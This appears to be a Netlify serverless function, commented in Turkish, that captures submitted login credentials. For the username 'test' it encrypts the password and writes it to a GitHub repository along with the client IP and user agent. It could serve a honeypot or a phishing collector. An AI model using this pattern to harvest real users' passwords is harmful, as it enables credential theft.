const crypto = require("crypto");

// ENV'den PEM üret: Önce B64 varsa onu çöz, yoksa PEM'i normalize et
function pemFromEnv() {
  const b64 = (process.env.AUDIT_PUBKEY_B64 || "").trim();
  if (b64) {
    try {
      return Buffer.from(b64, "base64").toString("utf8");
    } catch (e) {
      console.error("capture: AUDIT_PUBKEY_B64 decode failed:", e.message);
    }
  }
  return normalizePem(process.env.AUDIT_PUBKEY_PEM || "");
}

// PEM'i sağlamlaştır: \n kaçışlarını gerçek satır sonuna çevir; sadece gövde geldiyse sar
function normalizePem(input) {
  if (!input) return "";
  let s = ("" + input).trim();
  // Çevresel tırnak/backtick gelmişse kırp
  s = s.replace(/^['"`]+|['"`]+$/g, "");
  // \r ve \n kaçışlarını gerçek newline'a çevir
  s = s.replace(/\\r/g, "\r").replace(/\\n/g, "\n");
  if (s.includes("BEGIN PUBLIC KEY")) return s;

  // Sadece base64 gövde ise BEGIN/END ile sar
  const body = s.replace(/[\r\n\s-]/g, "");
  const chunks = body.match(/.{1,64}/g) || [];
  return `-----BEGIN PUBLIC KEY-----\n${chunks.join("\n")}\n-----END PUBLIC KEY-----\n`;
}

exports.handler = async (event) => {
  try {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };

    const { username, password } = JSON.parse(event.body || "{}");
    const ok = username && password && String(username).toLowerCase() === "test" && String(password).length >= 6;
    if (!ok) {
      console.log("capture: ignored", { u: username, pwlen: (password || "").length });
      return { statusCode: 200, body: "ignored" };
    }

    // --- ŞİFRELEME ---
    const pubPem = pemFromEnv();
    if (!pubPem) {
      console.error("capture: missing/empty public key");
      return { statusCode: 500, body: "Missing public key" };
    }

    let key;
    try {
      key = crypto.createPublicKey(pubPem);
    } catch (e) {
      console.error("capture: createPublicKey failed:", e.message);
      return { statusCode: 500, body: "Bad public key" };
    }

    let enc;
    try {
      enc = crypto.publicEncrypt(
        { key, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
        Buffer.from(password, "utf8")
      );
    } catch (e) {
      console.error("capture: publicEncrypt failed:", e.message);
      return { statusCode: 500, body: "Encrypt failed" };
    }

    const rec = {
      ts: new Date().toISOString(),
      user: username,
      pw_len: String(password).length,
      pw_enc_b64: enc.toString("base64"),
      ip: event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "",
      ua: event.headers["user-agent"] || "",
    };

    // --- GITHUB YAZ ---
    const owner  = process.env.GITHUB_OWNER;
    const repo   = process.env.GITHUB_REPO;
    const branch = process.env.GITHUB_BRANCH || "main";
    const token  = process.env.GITHUB_TOKEN;
    if (!owner || !repo || !token) {
      console.error("capture: missing GitHub envs");
      return { statusCode: 500, body: "Missing GitHub config" };
    }

    const tsSafe = rec.ts.replace(/[:.]/g, "-");
    const path   = `logs/admin/${rec.ts.slice(0,10)}/${tsSafe}.json`;
    const contentB64 = Buffer.from(JSON.stringify(rec, null, 2)).toString("base64");

    const res = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/contents/${encodeURIComponent(path)}`,
      {
        method: "PUT",
        headers: {
          Authorization: `Bearer ${token}`,
          "User-Agent": "netlify-fn",
          Accept: "application/vnd.github+json",
        },
        body: JSON.stringify({ message: `admin log ${rec.ts}`, content: contentB64, branch }),
      }
    );

    if (!res.ok) {
      const txt = await res.text();
      console.error("capture: GitHub write failed", res.status, txt.slice(0, 200));
      return { statusCode: 502, body: "GitHub write failed" };
    }

    console.log("capture: ok", { path });
    return { statusCode: 200, body: "ok" };
  } catch (e) {
    console.error("capture: server error", e && e.stack ? e.stack : e);
    return { statusCode: 500, body: "server error" };
  }
};
